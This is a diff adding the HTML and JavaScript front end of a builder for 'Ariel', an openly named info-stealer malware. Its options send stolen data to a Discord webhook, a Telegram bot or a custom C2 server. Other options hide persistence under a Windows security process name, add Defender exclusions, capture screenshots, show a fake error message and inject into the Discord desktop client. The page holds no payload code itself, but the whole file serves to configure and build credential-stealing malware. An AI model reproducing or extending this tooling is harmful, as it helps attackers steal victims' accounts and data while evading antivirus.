@@ -1,0 +1,180 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Ariel Builder</title>
+<style>
+body { font: 13px "Segoe UI", sans-serif; margin: 16px; width: 360px; }
+label { display: block; margin-top: 8px; }
+input[type=text], input[type=password], textarea { width: 100%; box-sizing: border-box; }
+.row { margin-top: 12px; }
+.hidden { display: none; }
+.hint { margin-top: 4px; color: #666; font-size: 12px; }
+button { cursor: pointer; }
+#status { margin-top: 12px; min-height: 18px; color: #444; }
+</style>
+</head>
+<body>
+<label>Built name<input type="text" id="name" value="ariel"></label>
+<label>Icon (.ico)<input type="text" id="icon" placeholder="optional"></label>
+<div class="row"><button type="button" id="pickIcon">Browse icon</button></div>
+
+<label><input type="checkbox" id="useDiscord" checked> Use Discord webhook</label>
+<div id="discordFields">
+  <label>Webhook<input type="text" id="webhook"></label>
+  <label>Embed thumbnail url<input type="text" id="thumbnailUrl" value="https://raw.githubusercontent.com/ihateapples/ariel-stealer/refs/heads/main/icon.png"></label>
+  <div class="hint">GitHub: ihateapples/ariel-stealer</div>
+</div>
+<label><input type="checkbox" id="useTelegram"> Use Telegram bot</label>
+<div id="telegramFields" class="hidden">
+  <label>Bot token<input type="password" id="token"></label>
+  <label>Chat id<input type="text" id="chat"></label>
+</div>
+<label><input type="checkbox" id="useC2"> Use custom C2</label>
+<div id="c2Fields" class="hidden">
+  <label>C2 url<input type="text" id="c2url"></label>
+  <label>C2 file field<input type="text" id="c2field" value="file"></label>
+  <label>C2 headers<textarea id="c2headers" rows="2"></textarea></label>
+  <label>C2 fields<textarea id="c2fields" rows="2" placeholder="key=value"></textarea></label>
+</div>
+
+<label>Zip password<input type="password" id="password"></label>
+<label>CMake path (optional)<input type="text" id="cmake" placeholder="auto detect"></label>
+
+<label><input type="checkbox" id="startup"> Add to startup</label>
+<label>Startup process name<input type="text" id="startupName" value="SecurityHealthSystray.exe"></label>
+<label>AppData folder<input type="text" id="appdataDir" value="SecurityHealthSystray"></label>
+<label><input type="checkbox" id="pingEveryone"> @everyone on Discord message</label>
+<label><input type="checkbox" id="defender"> Defender exclusions on target (needs admin there)</label>
+<label><input type="checkbox" id="screenshot"> Capture desktop screenshot</label>
+<label><input type="checkbox" id="debug"> Debug console</label>
+<label><input type="checkbox" id="requireAdmin"> Require admin on run</label>
+<label><input type="checkbox" id="fakeError"> Fake error message</label>
+<label>Error title<input type="text" id="errorTitle" value="Error"></label>
+<label>Error message<input type="text" id="errorMessage" placeholder="message shown on run"></label>
+<label><input type="checkbox" id="discordInjection"> Inject Discord desktop</label>
+
+<div class="row">
+  <button type="button" id="saveConfig">Save config</button>
+  <button id="build">Build</button>
+</div>
+<div id="status"></div>
+<script>
+function collectValues() {
+  const useDiscord = document.getElementById('useDiscord').checked;
+  const useTelegram = document.getElementById('useTelegram').checked;
+  const useC2 = document.getElementById('useC2').checked;
+  return {
+    name: document.getElementById('name').value,
+    icon: document.getElementById('icon').value,
+    cmake: document.getElementById('cmake').value,
+    useDiscord,
+    useTelegram,
+    useC2,
+    webhook: useDiscord ? document.getElementById('webhook').value : '',
+    thumbnailUrl: useDiscord ? document.getElementById('thumbnailUrl').value : '',
+    token: useTelegram ? document.getElementById('token').value : '',
+    chat: useTelegram ? document.getElementById('chat').value : '',
+    c2url: useC2 ? document.getElementById('c2url').value : '',
+    c2field: useC2 ? document.getElementById('c2field').value : '',
+    c2headers: useC2 ? document.getElementById('c2headers').value : '',
+    c2fields: useC2 ? document.getElementById('c2fields').value : '',
+    password: document.getElementById('password').value,
+    install: document.getElementById('startup').checked,
+    startupName: document.getElementById('startupName').value,
+    appdataDir: document.getElementById('appdataDir').value,
+    pingEveryone: document.getElementById('pingEveryone').checked,
+    defender: document.getElementById('defender').checked,
+    screenshot: document.getElementById('screenshot').checked,
+    debug: document.getElementById('debug').checked,
+    requireAdmin: document.getElementById('requireAdmin').checked,
+    fakeError: document.getElementById('fakeError').checked,
+    errorTitle: document.getElementById('errorTitle').value,
+    errorMessage: document.getElementById('errorMessage').value,
+    discordInjection: document.getElementById('discordInjection').checked,
+  };
+}
+
+function updateVisibility() {
+  const discord = document.getElementById('useDiscord').checked;
+  const telegram = document.getElementById('useTelegram').checked;
+  const c2 = document.getElementById('useC2').checked;
+  document.getElementById('discordFields').classList.toggle('hidden', !discord);
+  document.getElementById('telegramFields').classList.toggle('hidden', !telegram);
+  document.getElementById('c2Fields').classList.toggle('hidden', !c2);
+}
+
+document.getElementById('useDiscord').addEventListener('change', (event) => {
+  if (event.target.checked) document.getElementById('useTelegram').checked = false;
+  updateVisibility();
+});
+document.getElementById('useTelegram').addEventListener('change', (event) => {
+  if (event.target.checked) document.getElementById('useDiscord').checked = false;
+  updateVisibility();
+});
+document.getElementById('useC2').addEventListener('change', updateVisibility);
+
+document.getElementById('pickIcon').addEventListener('click', async () => {
+  const chosen = await window.ariel.pickIcon();
+  if (chosen) document.getElementById('icon').value = chosen;
+});
+
+window.ariel.onBuildStatus((text) => {
+  document.getElementById('status').textContent = text;
+});
+
+document.getElementById('saveConfig').addEventListener('click', async () => {
+  const status = document.getElementById('status');
+  try {
+    await window.ariel.saveConfig(collectValues());
+    status.textContent = 'config saved';
+  } catch (error) {
+    status.textContent = String(error.message || error);
+  }
+});
+
+document.getElementById('build').addEventListener('click', async () => {
+  const status = document.getElementById('status');
+  status.textContent = 'working...';
+  try {
+    status.textContent = await window.ariel.build(collectValues());
+  } catch (error) {
+    status.textContent = String(error.message || error);
+  }
+});
+
+(async () => {
+  const saved = await window.ariel.loadConfig();
+  if (!saved) {
+    updateVisibility();
+    return;
+  }
+  if (saved.useDiscord === undefined) saved.useDiscord = Boolean(saved.webhook);
+  if (saved.useTelegram === undefined) saved.useTelegram = Boolean(saved.token && saved.chat);
+  if (saved.useC2 === undefined) saved.useC2 = Boolean(saved.c2url);
+  if (saved.startup === undefined && saved.install !== undefined) saved.startup = saved.install;
+  if (saved.useDiscord && saved.useTelegram) saved.useTelegram = false;
+
+  const texts = {
+    name: 'name', icon: 'icon', cmake: 'cmake', webhook: 'webhook', token: 'token', chat: 'chat',
+    thumbnailUrl: 'thumbnailUrl', c2url: 'c2url', c2field: 'c2field', c2headers: 'c2headers',
+    c2fields: 'c2fields', errorTitle: 'errorTitle', errorMessage: 'errorMessage',
+    startupName: 'startupName', appdataDir: 'appdataDir',
+  };
+  const checks = {
+    startup: 'startup', pingEveryone: 'pingEveryone', defender: 'defender',
+    screenshot: 'screenshot', debug: 'debug',
+    requireAdmin: 'requireAdmin', fakeError: 'fakeError', discordInjection: 'discordInjection',
+    useDiscord: 'useDiscord', useTelegram: 'useTelegram', useC2: 'useC2',
+  };
+  for (const [id, key] of Object.entries(texts)) {
+    if (saved[key] !== undefined) document.getElementById(id).value = saved[key];
+  }
+  for (const [id, key] of Object.entries(checks)) {
+    document.getElementById(id).checked = Boolean(saved[key]);
+  }
+  updateVisibility();
+})();
+</script>
+</body>
+</html>
